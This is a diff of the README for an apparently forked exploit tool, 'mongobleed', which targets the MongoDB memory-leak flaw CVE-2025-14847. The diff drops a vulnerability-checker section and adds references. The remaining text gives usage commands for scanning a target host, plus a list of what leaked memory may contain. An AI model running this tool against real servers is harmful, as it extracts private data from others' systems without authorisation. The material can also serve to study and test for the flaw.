@@ -9,7 +9,6 @@ Forked from [original mongobleed](https://github.com/joedesimone/mongobleed) by 
 
 - **Multithreading**: 10x faster scanning with configurable thread count (default: 10 threads)
 - **Real-time progress**: Live progress bar showing completion percentage and leaked bytes
-- **Vulnerability checker**: `check_vuln.py` tests actual vulnerability with 3 offsets instead of version guessing
 - **Better error handling**: Cleaner connection handling and timeout management
 
 ---
@@ -38,12 +37,6 @@ A flaw in MongoDB's zlib message decompression returns the allocated buffer size
 
 ## Usage
 
-**Check if vulnerable:**
-```bash
-python3 check_vuln.py --host <target>
-```
-
-**Full memory extraction:**
 ```bash
 # Basic scan (offsets 20-8192, 10 threads)
 python3 bleed.py --host <target>
@@ -71,34 +64,6 @@ python3 bleed.py --host <target> --min-offset 100 --max-offset 20000
 
 ## Example Output
 
-**Vulnerability Check:**
-```
-============================================================
-  CVE-2025-14847 MongoDB Vulnerability Checker
-  Author: SirBugs (Fares Walid)
-============================================================
-
-Target: 192.168.1.100:27017
-
-[*] Testing connection...
-[+] Server responded (158 bytes)
-[+] MongoDB server detected
-
-[*] Testing for CVE-2025-14847...
-[*] Trying exploit offsets...
-
-============================================================
-  STATUS: VULNERABLE ⚠️
-
-  CVE-2025-14847 confirmed!
-  Successfully leaked 3 memory fragments
-
-  Memory disclosure vulnerability is exploitable!
-  Run bleed.py for full memory extraction
-============================================================
-```
-
-**Full Extraction:**
 ```
 [*] mongobleed - CVE-2025-14847 MongoDB Memory Leak
 [*] Original Author: Joe Desimone - x.com/dez_
@@ -130,3 +95,8 @@ Leaked data may include:
 - System `/proc` data (meminfo, network stats)
 - Docker container paths
 - Connection UUIDs and client IPs
+
+## References
+
+- Original exploit: [mongobleed](https://github.com/joedesimone/mongobleed) by Joe Desimone
+- CVE: CVE-2025-14847
